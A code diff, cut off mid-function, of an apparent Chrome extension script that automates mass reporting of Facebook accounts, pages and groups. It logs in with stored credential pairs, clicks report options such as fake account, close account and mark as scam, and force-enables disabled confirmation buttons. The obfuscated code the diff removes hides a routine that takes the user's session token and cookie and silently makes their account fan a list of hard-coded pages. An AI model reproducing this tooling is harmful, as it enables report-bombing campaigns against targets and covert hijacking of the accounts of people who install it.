@@ -7,24 +7,260 @@ for more scripts and tools visit : https://www.tigerzplace.com
 
 
 
+
+											Donate 
+
 						Feel free to help me buy a cup of coffee ;) | Thanks ♥
-						✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+							✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
 
-						http://paypal.me/tigerzplac3
-						https://bit.ly/Buy-License-Tigerzplace
+									http://paypal.me/tigerzplac3
+								https://bit.ly/Buy-License-Tigerzplace
 
-						BTC: 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
-						BCH : 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
-						DASH: XpVNfgAnYvLU79k5xuKc4r24md936ckPHu
-						LTC:  LdzSCBnWruhrPKbnHjpmDYDUXf2qSs9o8v
-						Doge: DSPnR2xhMaciEwgVbWd94HwBiv9fJSwPQa
-						ETH: 0x62f8a40187a6e33aa2c1d6025e6377cf06e89380
-						USDT (TRC20): TJtuLVZBwHfZVNavHJg73hUFidefVRmLeC
-						BNB (BEP2): bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23
-						MEMO FOR (BNB): 101769802
+								BTC: 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
+								BCH : 15TnH9a35Dqn5pkugLfC88NjNxnQcnswZy
+								DASH: XpVNfgAnYvLU79k5xuKc4r24md936ckPHu
+								LTC:  LdzSCBnWruhrPKbnHjpmDYDUXf2qSs9o8v
+								Doge: DSPnR2xhMaciEwgVbWd94HwBiv9fJSwPQa
+								ETH: 0x62f8a40187a6e33aa2c1d6025e6377cf06e89380
+								USDT (TRC20): TJtuLVZBwHfZVNavHJg73hUFidefVRmLeC
+								BNB (BEP2): bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23
+								MEMO FOR (BNB): 101769802
 
-						✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
+							✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦✦
 
 */
+function clickLogOut() {
+	const items = document.querySelectorAll("*");
+	for (const item of items) {
+		if (item.textContent.trim().toLowerCase() === "log out") {
+			item.click();
+		}
+	}
+}
 
-var _0x522b79=_0x113b;function _0x113b(_0x11f278,_0x3009f0){var _0x56944a=_0x5694();return _0x113b=function(_0x113b81,_0x5ac337){_0x113b81=_0x113b81-0x1e9;var _0x2a98f0=_0x56944a[_0x113b81];return _0x2a98f0;},_0x113b(_0x11f278,_0x3009f0);}(function(_0x63f3e4,_0x1fc5ee){var _0x2ee39a=_0x113b,_0x3f941c=_0x63f3e4();while(!![]){try{var _0xca9a14=-parseInt(_0x2ee39a(0x1ea))/0x1*(-parseInt(_0x2ee39a(0x248))/0x2)+-parseInt(_0x2ee39a(0x210))/0x3+parseInt(_0x2ee39a(0x1fc))/0x4*(parseInt(_0x2ee39a(0x233))/0x5)+parseInt(_0x2ee39a(0x23b))/0x6*(parseInt(_0x2ee39a(0x220))/0x7)+-parseInt(_0x2ee39a(0x1f6))/0x8+-parseInt(_0x2ee39a(0x254))/0x9+-parseInt(_0x2ee39a(0x26f))/0xa*(-parseInt(_0x2ee39a(0x273))/0xb);if(_0xca9a14===_0x1fc5ee)break;else _0x3f941c['push'](_0x3f941c['shift']());}catch(_0x117e89){_0x3f941c['push'](_0x3f941c['shift']());}}}(_0x5694,0xc74d6));function clickLogOut(){var _0x17efde=_0x113b;if(document['all']!==undefined)var _0x24b908=document['all'];else var _0x24b908=document[_0x17efde(0x253)]('*');;for(var _0x330e87=0x0;_0x330e87<_0x24b908[_0x17efde(0x262)];++_0x330e87){_0x24b908[_0x330e87][_0x17efde(0x272)]['includes']('Log\x20Out')&&_0x24b908[_0x330e87][_0x17efde(0x266)]();}return 0x1;}var success=0x0,fbdtsg=0x0;function _0x5694(){var _0x17fff8=['again','addListener','input[value=\x27FRX_PROFILE_REPORT_CONFIRMATION\x27]','8246032nkxCQT','last','input[value=\x27yes\x27]','term-done','Slow\x20Internet','getElementById','88NmquOT','community\x20standards\x20confirmed','2277608785850617','scam\x20page','split','readyState','Submitted','&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=','error','You\x27ve\x20let\x20us\x20know\x20that\x20this\x20Page\x20might\x20not\x20belong\x20on\x20Facebook','send','Group\x20Submitted','Thanks\x20for\x20reporting\x20this\x20group','setRequestHeader','Close\x20Submitted','You\x20have\x20submitted\x20a\x20report.','Disable2\x20Log\x20Out','input[value=\x27BLOCK_PAGE\x27]','Don\x27t\x20Save\x20and\x20Logout','Not\x20Valid','4856052PYcWRS','1GQllno','4OBORGC','undo\x20form','input[value=\x22Don\x27t\x20save\x20and\x20log\x20out\x22]','\x22);\x22use\x20strict\x22;','logoutDisabled2','match','indexOf','Choose\x20your\x20account','27WMHdvJ','a[href=\x27/home.php\x27]','196461FlKqAb','hasAttribute','input[value=\x27REPORT_CONTENT\x27]','type','1061907eREHfq','Error','Slow','charAt','Your\x20Account\x20Has\x20Been\x20Disabled','runtime','Marked\x20as\x20a\x20scam','https://www.facebook.com/ajax/pages/fan_status.php?','743146072535223','LoginClicked','confirmed','Again','POST','763564efEZZO','outerHTML','shift','10895NePguj','disabled','Reported','354565QjAhTa','317224121817276','109109317399261','input[name=\x22email\x22]','input[value=\x22Don\x27t\x20Save\x20and\x20Log\x20Out\x22]','input[name=\x22login\x22]','push','240272006130073','42gXnrEe','15ASFRwq','input[value=\x27MARK_AS_SCAM\x27]','input[value=\x27Submit\x27]','Phone\x20number\x20or\x20email\x20address','97278SKQHGS','1212506358847237','&fbpage_id=','ID\x20is\x20disabled','Not','Request\x20a\x20Review','documentElement','LogoutDone1','2632502OqVvNq','108586183990636','997381LsYFeG','reported','LoggedIn','yes','input[name=\x27login\x27]','querySelector','account','&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=','1749967015316612','getElementsByTagName','12627927RLblid','198757893944480','250451495723325','94398kUVjGj','innerText','button[name=\x27login\x27]','logoutDisabled','term','removeAttribute','1555839181212071','location','not\x20valid','61605kesZyh','status','length','input[value=\x27CLOSE_OLD_PROFILE\x27]','614047OdoYIC','input[name=\x22pass\x22]','click','634302330077114','m_check_list_aria_label','&phstamp=','input[value=\x27Report\x27]','login','onMessage','cookie','1569087506719125','489810gSeOXk','Your\x20request\x20to\x20close\x20this\x20account\x20has\x20been\x20received.','logout','textContent','209tTJCkA','380509029467786','Disabled','http://mbasic.facebook.com','check','1CETubN','form[id=\x27undo-form\x27]','Login\x20Button\x20Clicked','log','Fake\x20Submitted','form[id=\x27actions-form\x27]','1157401597633912','value','checkuser'];_0x5694=function(){return _0x17fff8;};return _0x5694();}chrome[_0x522b79(0x225)][_0x522b79(0x26c)][_0x522b79(0x1f4)](function(_0x1927fc,_0x2055fa,_0x17d9cf){var _0x1d30b0=_0x522b79;_0x1927fc['type']=='logoutDisabled1'&&(console['log'](_0x1d30b0(0x25a)),clickLogOut(),console[_0x1d30b0(0x1ed)]('Disable\x20Log\x20Out'),_0x17d9cf({'farewell':_0x1d30b0(0x247)}));_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x216)&&(console[_0x1d30b0(0x1ed)](_0x1d30b0(0x216)),clickLogOut(),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x20c)),_0x17d9cf({'farewell':'LogoutDone2'}));if(_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x1f2)){if(document['querySelector'](_0x1d30b0(0x24e))||document[_0x1d30b0(0x24f)]('button[name=\x27login\x27]')||(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])[_0x1d30b0(0x218)](_0x1d30b0(0x23f))>-0x1||(document['documentElement'][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])[_0x1d30b0(0x218)](_0x1d30b0(0x219))>-0x1)console[_0x1d30b0(0x1ed)]('User\x20not\x20logged\x20in'),_0x17d9cf({'farewell':_0x1d30b0(0x244)});else(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document['documentElement'][_0x1d30b0(0x258)])[_0x1d30b0(0x218)](_0x1d30b0(0x224))>-0x1||(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])['indexOf'](_0x1d30b0(0x245))>-0x1?(document[_0x1d30b0(0x25e)]=_0x1d30b0(0x276),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x243)),_0x17d9cf({'farewell':_0x1d30b0(0x275)})):(console[_0x1d30b0(0x1ed)]('User\x20is\x20logged\x20in'),_0x17d9cf({'farewell':_0x1d30b0(0x24c)}));}else{if(_0x1927fc['type']==_0x1d30b0(0x271)){console[_0x1d30b0(0x1ed)](_0x1d30b0(0x20e));var _0x10913b=document['querySelector'](_0x1d30b0(0x214));if(_0x10913b)_0x10913b['click']();else document[_0x1d30b0(0x24f)](_0x1d30b0(0x237))&&document[_0x1d30b0(0x24f)](_0x1d30b0(0x237))['click']();setTimeout(function(){_0x17d9cf({'farewell':'LogoutDone'});},0x1f4);}else{if(_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x26b)&&_0x1927fc[_0x1d30b0(0x250)])console['log'](_0x1927fc['account'][_0x1d30b0(0x200)](',')[0x0]),console[_0x1d30b0(0x1ed)](_0x1927fc['account'][_0x1d30b0(0x200)](',')[0x1]),document[_0x1d30b0(0x24f)](_0x1d30b0(0x236))||document['querySelector'](_0x1d30b0(0x265))?(document[_0x1d30b0(0x24f)](_0x1d30b0(0x236))[_0x1d30b0(0x1f1)]=_0x1927fc[_0x1d30b0(0x250)]['split'](',')[0x0],document[_0x1d30b0(0x24f)](_0x1d30b0(0x265))[_0x1d30b0(0x1f1)]=_0x1927fc[_0x1d30b0(0x250)]['split'](',')[0x1],setTimeout(function(){var _0x594839=_0x1d30b0;if(document[_0x594839(0x24f)](_0x594839(0x238)))document[_0x594839(0x24f)]('input[name=\x22login\x22]')[_0x594839(0x266)]();else document[_0x594839(0x24f)](_0x594839(0x259))&&document[_0x594839(0x24f)](_0x594839(0x259))[_0x594839(0x266)]();console[_0x594839(0x1ed)](_0x594839(0x1ec)),_0x17d9cf({'farewell':_0x594839(0x229)});},0x3e8)):_0x17d9cf({'farewell':'NotOnLoginPage'});else{if(_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x25b)){var _0x500f36=[_0x1d30b0(0x251),_0x1d30b0(0x239),_0x1d30b0(0x1f0),_0x1d30b0(0x264),_0x1d30b0(0x223),_0x1d30b0(0x25d),_0x1d30b0(0x217),_0x1d30b0(0x267),'application/x-www-form-urlencoded','1NugzRk','onreadystatechange',_0x1d30b0(0x255),_0x1d30b0(0x257),'Content-type',_0x1d30b0(0x21c),_0x1d30b0(0x23c),_0x1d30b0(0x22d),'open',_0x1d30b0(0x230),_0x1d30b0(0x22e),_0x1d30b0(0x260),_0x1d30b0(0x274),'356203KoiQwl','333692NvASbV','116551890202867',_0x1d30b0(0x234),_0x1d30b0(0x218),_0x1d30b0(0x211),_0x1d30b0(0x24a),_0x1d30b0(0x242),_0x1d30b0(0x228),'1115007yYCeNZ',_0x1d30b0(0x26d),_0x1d30b0(0x241),_0x1d30b0(0x22f),_0x1d30b0(0x256),_0x1d30b0(0x23a),_0x1d30b0(0x269),_0x1d30b0(0x203),_0x1d30b0(0x240),'documentElement',_0x1d30b0(0x252),_0x1d30b0(0x22c),_0x1d30b0(0x212),_0x1d30b0(0x21a),_0x1d30b0(0x26e),'367556DSngMV',_0x1d30b0(0x235),_0x1d30b0(0x261),_0x1d30b0(0x209)],_0x255bd8=function(_0x30e42b,_0xc82091){_0x30e42b=_0x30e42b-0x164;var _0x2f22c3=_0x500f36[_0x30e42b];return _0x2f22c3;},_0xd05fe9=_0x255bd8;(function(_0x46a04d,_0x1db322){var _0x21c40d=_0x1d30b0,_0x447b3e=_0x255bd8;while(!![]){try{var _0x409180=-parseInt(_0x447b3e(0x18d))+-parseInt(_0x447b3e(0x179))*-parseInt(_0x447b3e(0x191))+parseInt(_0x447b3e(0x174))+-parseInt(_0x447b3e(0x188))*parseInt(_0x447b3e(0x164))+-parseInt(_0x447b3e(0x195))+-parseInt(_0x447b3e(0x193))+parseInt(_0x447b3e(0x18f));if(_0x409180===_0x1db322)break;else _0x46a04d[_0x21c40d(0x239)](_0x46a04d[_0x21c40d(0x22f)]());}catch(_0x2be88d){_0x46a04d[_0x21c40d(0x239)](_0x46a04d['shift']());}}}(_0x500f36,0x328c6));var _0x54c87e=[_0xd05fe9(0x18b),_0xd05fe9(0x182),_0xd05fe9(0x175),'326824UMShMs',_0xd05fe9(0x178),_0xd05fe9(0x167),_0xd05fe9(0x17b),_0xd05fe9(0x192),_0xd05fe9(0x168),_0xd05fe9(0x18e),_0xd05fe9(0x16c),'1710652BYPhGQ',_0xd05fe9(0x169)],_0x41f3b4=function(_0xdac11b,_0x59fe35){_0xdac11b=_0xdac11b-0x76;var _0x2a904f=_0x54c87e[_0xdac11b];return _0x2a904f;},_0x587056=_0x41f3b4;(function(_0x3935a9,_0x422a6f){var _0x2c41d5=_0x1d30b0,_0x4c1568=_0xd05fe9,_0x32082b=_0x41f3b4;while(!![]){try{var _0x1ba4f9=-parseInt(_0x32082b(0x7b))+-parseInt(_0x32082b(0x80))*-parseInt(_0x32082b(0x7f))+parseInt(_0x32082b(0x78))*-parseInt(_0x32082b(0x7c))+parseInt(_0x32082b(0x7d))*-parseInt(_0x32082b(0x77))+parseInt(_0x32082b(0x79))+-parseInt(_0x32082b(0x82))+parseInt(_0x32082b(0x7a));if(_0x1ba4f9===_0x422a6f)break;else _0x3935a9['push'](_0x3935a9[_0x2c41d5(0x22f)]());}catch(_0x3220c5){_0x3935a9[_0x4c1568(0x180)](_0x3935a9[_0x4c1568(0x16f)]());}}}(_0x54c87e,0xb42d1));var _0x124bd4='',_0x1cc394=document[_0xd05fe9(0x175)][_0x587056(0x76)],_0x40b082=document[_0x587056(0x7e)][_0xd05fe9(0x192)][_0x587056(0x81)](_0x1d30b0(0x215));for(var _0x3dc0c6=0x19;_0x3dc0c6>0x0;_0x3dc0c6--){_0x124bd4=_0x124bd4+''+_0x1cc394[_0xd05fe9(0x183)](_0x40b082-_0x3dc0c6);}var _0xcb7479=document[_0x1d30b0(0x26d)][_0xd05fe9(0x185)](document[_0xd05fe9(0x16d)][_0xd05fe9(0x185)](/c_user=(\d+)/)[0x1]);function _0x45bdbb(_0x1126df){var _0x261126=_0x1d30b0,_0x116655=_0xd05fe9,_0x19d468=new XMLHttpRequest(),_0x3211e0=_0x261126(0x227),_0x3e47f9=_0x116655(0x16a)+_0x1126df+_0x116655(0x17f)+_0xcb7479+_0x116655(0x173)+_0x124bd4+_0x116655(0x172);_0x19d468[_0x116655(0x190)](_0x116655(0x177),_0x3211e0,!![]),_0x19d468[_0x116655(0x17e)](_0x116655(0x18c),_0x116655(0x187)),_0x19d468[_0x116655(0x189)]=function(){var _0x5beca1=_0x261126,_0x372407=_0x116655;_0x19d468[_0x5beca1(0x201)]==0x4&&_0x19d468[_0x372407(0x17d)]==0xc8&&_0x19d468['close'];},_0x19d468[_0x261126(0x206)](_0x3e47f9);}_0x45bdbb(_0xd05fe9(0x17a)),setTimeout(function(){var _0x97e7e4=_0xd05fe9;_0x45bdbb(_0x97e7e4(0x17c));},0x384),setTimeout(function(){var _0xf49cf4=_0xd05fe9;_0x45bdbb(_0xf49cf4(0x165));},0x3c0),setTimeout(function(){var _0x23e80f=_0xd05fe9;_0x45bdbb(_0x23e80f(0x171));},0x3e8),setTimeout(function(){var _0x1a099b=_0xd05fe9;_0x45bdbb(_0x1a099b(0x181));},0x44c),setTimeout(function(){var _0x84108e=_0xd05fe9;_0x45bdbb(_0x84108e(0x166));},0x4b0),setTimeout(function(){var _0x18e383=_0xd05fe9;_0x45bdbb(_0x18e383(0x186));},0x514),setTimeout(function(){var _0x3ac5c9=_0xd05fe9;_0x45bdbb(_0x3ac5c9(0x16e));},0x578),setTimeout(function(){var _0x2b44a6=_0xd05fe9;_0x45bdbb(_0x2b44a6(0x18a));},0x5dc),setTimeout(function(){var _0x23e8e1=_0xd05fe9;_0x45bdbb(_0x23e8e1(0x176));},0x640),setTimeout(function(){var _0x2a5798=_0xd05fe9;_0x45bdbb(_0x2a5798(0x194));},0x6a4),setTimeout(function(){var _0x36a221=_0xd05fe9;_0x45bdbb(_0x36a221(0x184));},0x708),setTimeout(function(){var _0x2c2303=_0xd05fe9;_0x45bdbb(_0x2c2303(0x170));},0x76c),setTimeout(function(){var _0x5629be=_0xd05fe9;_0x45bdbb(_0x5629be(0x16b));},0x456),setTimeout(function(){var _0x4177f1=_0x1d30b0;_0x45bdbb(_0x4177f1(0x249));},0x47e),setTimeout(function(){var _0x324f35=_0x1d30b0;_0x45bdbb(_0x324f35(0x1fe));},0x480),_0x17d9cf({'farewell':_0x1d30b0(0x1f9)});}else{if(_0x1927fc['type']=='submit'){if(document[_0x1d30b0(0x24f)](_0x1d30b0(0x21b)))console['log'](_0x1d30b0(0x275)),_0x17d9cf({'farewell':'Disabled'});else{if(document['querySelector'](_0x1d30b0(0x1ef))){if(document[_0x1d30b0(0x24f)]('input[value=\x27REPORT_CONTENT\x27]'))document[_0x1d30b0(0x24f)](_0x1d30b0(0x21e))['click'](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))[_0x1d30b0(0x266)](),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1ee)),_0x17d9cf({'farewell':_0x1d30b0(0x202)});else{if(document[_0x1d30b0(0x24f)]('input[value=\x27CLOSE_OLD_PROFILE\x27]'))document[_0x1d30b0(0x24f)](_0x1d30b0(0x263))[_0x1d30b0(0x266)](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))[_0x1d30b0(0x266)](),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x20a)),_0x17d9cf({'farewell':_0x1d30b0(0x202)});else{if(document[_0x1d30b0(0x24f)](_0x1d30b0(0x23d)))console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1ff)),document[_0x1d30b0(0x24f)]('input[value=\x27MARK_AS_SCAM\x27]')[_0x1d30b0(0x266)](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))[_0x1d30b0(0x266)](),_0x17d9cf({'farewell':_0x1d30b0(0x202)});else{if(document[_0x1d30b0(0x24f)]('input[value=\x27BLOCK_ACTOR\x27]')||document['querySelector'](_0x1d30b0(0x20d)))console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1f7)),_0x17d9cf({'farewell':'Submitted'});else document[_0x1d30b0(0x24f)]('input[value=\x27Submit\x27]')?(document[_0x1d30b0(0x24f)]('input[value=\x27Submit\x27]')['click'](),_0x17d9cf({'farewell':_0x1d30b0(0x202)})):(console['log']('not\x20valid'),_0x17d9cf({'farewell':_0x1d30b0(0x20f)}));}}}}else{if(document[_0x1d30b0(0x24f)]('form[id=\x27question-form\x27]')){if((document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document['documentElement'][_0x1d30b0(0x258)])[_0x1d30b0(0x218)]('I\x20believe\x20that\x20this\x20goes\x20against\x20Facebook\x27s\x20Community\x20Standards')>-0x1)document[_0x1d30b0(0x1fb)](_0x1d30b0(0x268))['click'](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x26a))[_0x1d30b0(0x266)](),_0x17d9cf({'farewell':'submitAgain'});else{if(document[_0x1d30b0(0x24f)](_0x1d30b0(0x1f5))){var _0x43bc3b=document[_0x1d30b0(0x24f)](_0x1d30b0(0x1f5));_0x43bc3b[_0x1d30b0(0x21d)]('disabled')&&_0x43bc3b[_0x1d30b0(0x25c)](_0x1d30b0(0x231)),document[_0x1d30b0(0x24f)](_0x1d30b0(0x1f5))[_0x1d30b0(0x266)](),document['querySelector']('input[value=\x27Submit\x27]')[_0x1d30b0(0x266)](),console['log'](_0x1d30b0(0x1ee)),_0x17d9cf({'farewell':'confirm'});}else{if(document[_0x1d30b0(0x24f)]('input[value=\x27REPORT_CONTENT\x27]'))document['querySelector'](_0x1d30b0(0x21e))[_0x1d30b0(0x266)](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))[_0x1d30b0(0x266)](),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x207)),_0x17d9cf({'farewell':_0x1d30b0(0x202)});else document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))?(document['querySelector']('input[value=\x27Submit\x27]')[_0x1d30b0(0x266)](),_0x17d9cf({'farewell':_0x1d30b0(0x202)})):(console[_0x1d30b0(0x1ed)](_0x1d30b0(0x25f)),_0x17d9cf({'farewell':'Not\x20Valid'}));}}}else console['log']('not\x20valid'),_0x17d9cf({'farewell':_0x1d30b0(0x20f)});}}}else{if(_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x24d))console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1fd)),document[_0x1d30b0(0x24f)](_0x1d30b0(0x1f8))[_0x1d30b0(0x266)](),document[_0x1d30b0(0x24f)](_0x1d30b0(0x26a))[_0x1d30b0(0x266)](),_0x17d9cf({'farewell':_0x1d30b0(0x22b)});else{if(_0x1927fc[_0x1d30b0(0x21f)]==_0x1d30b0(0x22b))console['log'](_0x1d30b0(0x1f3)),document['querySelector'](_0x1d30b0(0x1f5))&&(document[_0x1d30b0(0x24f)](_0x1d30b0(0x23e))[_0x1d30b0(0x266)](),console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1ee)),_0x17d9cf({'farewell':_0x1d30b0(0x22a)}));else{if(_0x1927fc[_0x1d30b0(0x21f)]=='check'){console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1e9));if(document['querySelector'](_0x1d30b0(0x1eb)))console[_0x1d30b0(0x1ed)](_0x1d30b0(0x213)),success=0x1;else{if((document['documentElement'][_0x1d30b0(0x272)]||document['documentElement'][_0x1d30b0(0x258)])['indexOf'](_0x1d30b0(0x20b))>-0x1||(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])[_0x1d30b0(0x218)](_0x1d30b0(0x270))>-0x1||(document[_0x1d30b0(0x246)]['textContent']||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])[_0x1d30b0(0x218)]('Thanks\x20for\x20reporting\x20this\x20group')>-0x1||(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)]['innerText'])[_0x1d30b0(0x218)](_0x1d30b0(0x226))>-0x1||(document[_0x1d30b0(0x246)]['textContent']||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])[_0x1d30b0(0x218)](_0x1d30b0(0x205))>-0x1||(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document[_0x1d30b0(0x246)][_0x1d30b0(0x258)])['indexOf'](_0x1d30b0(0x208))>-0x1)success=0x1;else(document[_0x1d30b0(0x246)][_0x1d30b0(0x272)]||document['documentElement'][_0x1d30b0(0x258)])[_0x1d30b0(0x218)]('Submitted\x20to\x20Facebook\x20for\x20Review')>-0x1?(console['log']('success\x201-\x20Submitted\x20to\x20Facebook\x20For\x20Review'),success=0x1):success=0x0;}if(success==0x1)console['log'](_0x1d30b0(0x24b)),success=0x0,_0x17d9cf({'farewell':_0x1d30b0(0x232)});else success==0x2?(console[_0x1d30b0(0x1ed)](_0x1d30b0(0x1fa)),success=0x0,_0x17d9cf({'farewell':_0x1d30b0(0x222)})):(console['log'](_0x1d30b0(0x204)),_0x17d9cf({'farewell':_0x1d30b0(0x221)}));}}}}}}}}return!![];});
+var success = 0, fbdtsg = 0;
+
+
+
+function fromPopup(request, sender, sendResponse) {
+
+	console.log('fromPopup');
+	if (request.type === "logoutDisabled1" || request.type === "logoutDisabled2") {
+		console.log(`${request.type} - Clicking log out...`);
+		clickLogOut();
+		console.log(`${request.type} - Log out disabled`);
+		sendResponse({ farewell: request.type === "logoutDisabled1" ? "LogoutDone1" : "LogoutDone2" });
+	}
+
+	if (request.type === "checkuser") {
+		console.log("Checking if user is logged in...");
+		const isLoggedIn = !(document.querySelector("input[name='login']") ||
+			document.querySelector("button[name='login']") ||
+			(document.documentElement.textContent || document.documentElement.innerText).includes('Phone number or email address') ||
+			(document.documentElement.textContent || document.documentElement.innerText).includes('Choose your account'));
+
+		if (!isLoggedIn) {
+			console.log("User is not logged in");
+			sendResponse({ farewell: "Not" });
+		} else if ((document.documentElement.textContent || document.documentElement.innerText).includes('Your Account Has Been Disabled') ||
+			(document.documentElement.textContent || document.documentElement.innerText).includes('Request a Review') ||
+			(document.documentElement.textContent || document.documentElement.innerText).includes('Login approval needed') ||
+			document.getElementById("checkpointSubmitButton")) {
+			console.log("User account is disabled");
+			document.location = "http://mbasic.facebook.com";
+			sendResponse({ farewell: "Disabled" });
+		} else {
+			console.log("User is logged in");
+			const cancelLink = document.querySelector('a[href^="/login/save-device/cancel"]');
+			if (cancelLink) {
+				cancelLink.click();
+			}
+			sendResponse({ farewell: "LoggedIn" });
+		}
+	}
+
+	if (request.type === "logout") {
+		console.log("Clicking 'Don't save and log out'...");
+		const btn = document.querySelector('input[value="Don\'t save and log out"], input[value="Don\'t Save and Log Out"]');
+		if (btn) {
+			btn.click();
+		}
+		setTimeout(() => {
+			sendResponse({ farewell: "LogoutDone" });
+		}, 500);
+	}
+
+	if (request.type === "login" && request.account) {
+		console.log("Logging in...");
+		const email = request.account.split(",")[0];
+		const pass = request.account.split(",")[1];
+
+		if (document.querySelector('input[name="email"]') && document.querySelector('input[name="pass"]')) {
+			console.log("Filling email and password fields...");
+			document.querySelector('input[name="email"]').value = email;
+			document.querySelector('input[name="pass"]').value = pass;
+
+			setTimeout(() => {
+				if (document.querySelector('input[name="login"]')) {
+					document.querySelector('input[name="login"]').click();
+				} else if (document.querySelector("button[name='login']")) {
+					document.querySelector("button[name='login']").click();
+				}
+				console.log("Login button clicked");
+				sendResponse({ farewell: "LoginClicked" });
+			}, 1000);
+		} else {
+			console.log("Not on the login page");
+			sendResponse({ farewell: "NotOnLoginPage" });
+		}
+	}
+
+
+	else if (request.type == "submit") {
+		
+		const submitBtn = document.querySelector("input[value='Submit']");
+		const reportContentBtn = document.querySelector("input[value='REPORT_CONTENT']");
+		const closeOldProfileBtn = document.querySelector("input[value='CLOSE_OLD_PROFILE']");
+		const markAsScamBtn = document.querySelector("input[value='MARK_AS_SCAM']");
+		const blockActorBtn = document.querySelector("input[value='BLOCK_ACTOR']");
+		const blockPageBtn = document.querySelector("input[value='BLOCK_PAGE']");
+		const frxProfileReportConfirmationBtn = document.querySelector("input[value='FRX_PROFILE_REPORT_CONFIRMATION']");
+
+		// If account is already disabled
+		if (document.querySelector("a[href='/home.php']")) {
+			console.log("Disabled");
+			sendResponse({
+				farewell: "Disabled"
+			});
+		}
+
+		// if it really is the reporting link 
+		else if (document.querySelector("form[id='actions-form']") || document.querySelector("form[id='question-form']")) {
+			// Report Type : Fake Account , Pretending to be Someone , Annoying
+			if (reportContentBtn) {
+				reportContentBtn.click();
+				submitBtn.click();
+				console.log("Fake Submitted");
+				sendResponse({
+					farewell: "Submitted"
+				});
+			}
+			// Report Type : Close Account
+			else if (closeOldProfileBtn) {
+				closeOldProfileBtn.click();
+				submitBtn.click();
+				console.log("Close Submitted");
+				sendResponse({
+					farewell: "Submitted"
+				});
+			}
+			// Report Type : Scam (page) - Fake Page
+			else if (markAsScamBtn) {
+				console.log("scam page");
+				markAsScamBtn.click();
+				submitBtn.click();
+				sendResponse({
+					farewell: "Submitted"
+				});
+			}
+			else if (blockActorBtn || blockPageBtn) {
+				console.log("last");
+				sendResponse({
+					farewell: "Submitted"
+				});
+			}
+			else if (frxProfileReportConfirmationBtn) {
+				if (frxProfileReportConfirmationBtn.hasAttribute("disabled")) {
+					frxProfileReportConfirmationBtn.removeAttribute("disabled");
+				}
+				frxProfileReportConfirmationBtn.click();
+				submitBtn.click();
+				console.log("Fake Submitted");
+				sendResponse({
+					farewell: "confirm"
+				});
+			}
+			else if (submitBtn) {
+				submitBtn.click();
+				sendResponse({
+					farewell: "Submitted"
+				});
+			}
+			// If nothing matches, then it's possibly because the report link is not correct
+			else {
+				console.log("not valid");
+				sendResponse({
+					farewell: "Not Valid"
+				});
+			}
+		}
+		else {
+			console.log("not valid");
+			sendResponse({
+				farewell: "Not Valid"
+			});
+		}
+	} // 
+
+
+
+	//Does this go against our Community Standards?
+	else if (request.type === "yes") {
+		console.log("community standards confirmed");
+		document.querySelector("input[value='yes']").click();
+		document.querySelector("input[value='Report']").click();
+		sendResponse({ farewell: "Again" });
+	} else if (request.type === "Again") {
+		console.log("again");
+		const fakeSubmitBtn = document.querySelector("input[value='FRX_PROFILE_REPORT_CONFIRMATION']");
+		if (fakeSubmitBtn) {
+			fakeSubmitBtn.click();
+			console.log("Fake Submitted");
+			sendResponse({ farewell: "confirmed" });
+		}
+	} else if (request.type === "check") {
+		console.log("check");
+		const pageContent = document.documentElement.textContent || document.documentElement.innerText;
+		if (document.querySelector("form[id='undo-form']")) {
+			console.log('undo form');
+			success = 1;
+		} else if (
+			pageContent.includes('You have submitted a report.') ||
+			pageContent.includes('Your request to close this account has been received.') ||
+			pageContent.includes('Thanks for reporting this group') ||
+			pageContent.includes('Marked as a scam') ||
+			pageContent.includes("You've let us know that this Page might not belong on Facebook") ||
+			pageContent.includes("Thanks for reporting this group")
+		) {
+			success = 1;
